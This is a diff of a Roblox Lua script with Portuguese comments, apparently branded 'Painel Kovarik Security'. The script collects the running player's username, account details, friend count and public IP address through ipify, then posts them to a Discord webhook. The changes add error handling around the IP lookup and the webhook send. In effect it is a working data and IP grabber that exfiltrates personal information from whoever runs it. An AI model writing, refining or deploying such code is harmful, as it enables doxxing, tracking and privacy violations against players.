@@ -11,30 +11,34 @@ local function GetUserData()
     local username = lp.Name
     local display_name = lp.DisplayName
     
-    -- 1. AVATAR HEADSHOT
     local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId="..user_id.."&width=420&height=420&format=png"
     
     local creation_date = "N/A"
     local premium = lp.MembershipType == Enum.MembershipType.Premium and "Sim" or "Não"
     local age = lp.AccountAge
     local friend_count = 0
-    local public_ip = "Não foi possível obter"
+    local public_ip = "HTTP Disabled / Erro API"
 
-    -- 2. LÓGICA PARA PEGAR O IP (Via HttpService)
-    pcall(function()
-        -- Usamos o ipify que retorna um JSON simples
-        local response = HttpService:GetAsync("https://api.ipify.org?format=json")
-        local data = HttpService:JSONDecode(response)
-        public_ip = data.ip
+    -- 1. TENTATIVA DE PEGAR O IP COM TRATAMENTO DE ERRO
+    local success, result = pcall(function()
+        return HttpService:GetAsync("https://api.ipify.org?format=json")
     end)
 
-    -- 3. QUANTIDADE DE AMIGOS
+    if success then
+        local data = HttpService:JSONDecode(result)
+        public_ip = data.ip
+    else
+        -- Se falhar, pode ser que o HTTP esteja desativado nas configs do mapa
+        public_ip = "Permissão Negada (Ative o HTTP)"
+    end
+
+    -- 2. QUANTIDADE DE AMIGOS
     pcall(function()
         local friend_info = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..user_id.."/friends/count"))
         friend_count = friend_info.count
     end)
 
-    -- 4. DATA DE CRIAÇÃO
+    -- 3. DATA DE CRIAÇÃO
     pcall(function()
         local info = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..user_id))
         if info and info.created then
@@ -52,22 +56,27 @@ local function GetUserData()
             ["description"] = "[Rolimons](https://www.rolimons.com/player/"..user_id..") | [Roblox Profile](https://www.roblox.com/users/"..user_id.."/profile)",
             ["color"] = 11097043,
             ["thumbnail"] = {["url"] = thumb},
-            ["footer"] = {["text"] = "Painel Kovarik Security"},
+            ["footer"] = {["text"] = "Painel Kovarik Security | 2026"},
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username .. " ("..display_name..")", ["inline"] = true},
-                {["name"] = "Premium Status", ["value"] = premium, ["inline"] = true},
+                {["name"] = "Premium", ["value"] = premium, ["inline"] = true},
                 {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
                 {["name"] = "Friends", ["value"] = tostring(friend_count), ["inline"] = true},
                 {["name"] = "Account Age", ["value"] = age .. " dias", ["inline"] = true},
-                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = true}, -- IP escondido com spoiler
+                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = true},
             }
         }}
     }
 
-    -- Enviar para o Discord
-    local jsonData = HttpService:JSONEncode(data)
-    HttpService:PostAsync(Webhook_URL, jsonData)
+    -- 4. ENVIO FINAL
+    local sendSuccess, sendError = pcall(function()
+        local jsonData = HttpService:JSONEncode(data)
+        HttpService:PostAsync(Webhook_URL, jsonData)
+    end)
+    
+    if not sendSuccess then
+        warn("Falha ao enviar Webhook: " .. tostring(sendError))
+    end
 end
 
--- Executa a função
 GetUserData()
